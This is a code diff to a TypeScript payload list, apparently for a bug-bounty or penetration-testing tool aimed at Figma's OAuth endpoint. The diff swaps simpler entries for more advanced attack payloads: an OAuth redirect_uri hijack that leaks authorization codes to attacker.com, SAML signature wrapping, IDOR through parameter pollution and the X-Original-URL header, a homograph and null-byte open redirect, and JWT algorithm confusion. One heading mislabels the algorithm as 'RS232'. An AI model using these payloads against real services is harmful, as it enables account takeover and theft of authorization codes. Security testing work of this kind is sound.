@@ -149,38 +149,38 @@ export interface Payload {
 
 export const payloads: Payload[] = [
   {
-    name: "OAuth Redirect Bypass (Fragment)",
+    name: "OAuth Redirect Bypass (Fragment + Path)",
     type: "OAuth",
-    content: "https://evan-oauth.figma.com/authorize?client_id=REDACTED&redirect_uri=https://attacker.com/%23.figma.com",
-    description: "Bypasses whitelist by injecting a fragment that the server might ignore but the browser will use.",
-    technique: "Redirect URI Manipulation"
+    content: "https://evan-oauth.figma.com/authorize?client_id=REDACTED&redirect_uri=https://figma.com.attacker.com/auth/callback%23.figma.com",
+    description: "Advanced redirect_uri bypass using sub-domain spoofing and fragment injection to leak authorization codes to a rogue listener.",
+    technique: "OAuth Flow Hijacking"
   },
   {
-    name: "SAML Signature Wrapping (XSW)",
+    name: "SAML XSW-3 (Assertion Injection)",
     type: "Identity",
-    content: "<Assertion>...<Signature>...</Signature>...</Assertion><Assertion ID='evil'>...</Assertion>",
-    description: "Injects a second assertion to bypass signature validation in SAML responses.",
+    content: "<SAMLResponse>...<Assertion ID='signed'>...</Assertion><Assertion ID='unsigned'>[MALICIOUS_IDENTITY]</Assertion>...</SAMLResponse>",
+    description: "XML Signature Wrapping attack that injects an unsigned assertion which the backend prioritizes over the signed one, allowing identity spoofing.",
     technique: "XML Signature Wrapping"
   },
   {
-    name: "IDOR Parameter Pollution",
+    name: "IDOR via HPP (Header/Param Pollution)",
     type: "Access Control",
-    content: "GET /api/admin/users?userId=123&userId=456",
-    description: "Tests if the backend processes the second 'userId' parameter, potentially bypassing ownership checks.",
-    technique: "HTTP Parameter Pollution"
+    content: "GET /api/admin/users?userId=current&userId=target_admin_id\nX-Original-URL: /api/admin/settings",
+    description: "Combines HTTP Parameter Pollution with X-Original-URL header to bypass both frontend WAF and backend ownership checks.",
+    technique: "Multi-Stage Access Bypass"
   },
   {
-    name: "Open Redirect (Null Byte)",
+    name: "Open Redirect (Unicode/Null Byte Hybrid)",
     type: "Redirect",
-    content: "/out?url=https://attacker.com%00.figma.com",
-    description: "Uses a null byte to truncate the whitelist check on the server side.",
-    technique: "Null Byte Injection"
+    content: "/out?url=https://attacker.com%E3%80%82figma.com%00.figma.com",
+    description: "Uses Unicode homograph characters and null byte truncation to bypass regex-based domain whitelists.",
+    technique: "Homograph & Truncation Bypass"
   },
   {
-    name: "JWT Secret Brute-force Pattern",
+    name: "JWT Algorithm Confusion (RS232 to HS256)",
     type: "Authentication",
-    content: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
-    description: "Analyzes JWT structure for weak signing keys or 'none' algorithm support.",
-    technique: "JWT Manipulation"
+    content: "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.SIGNATURE_WITH_PUBLIC_KEY",
+    description: "Attempts to force the backend to verify an RS256-signed token using HS256 with the public key as the secret.",
+    technique: "JWT Algorithm Confusion"
   }
 ];
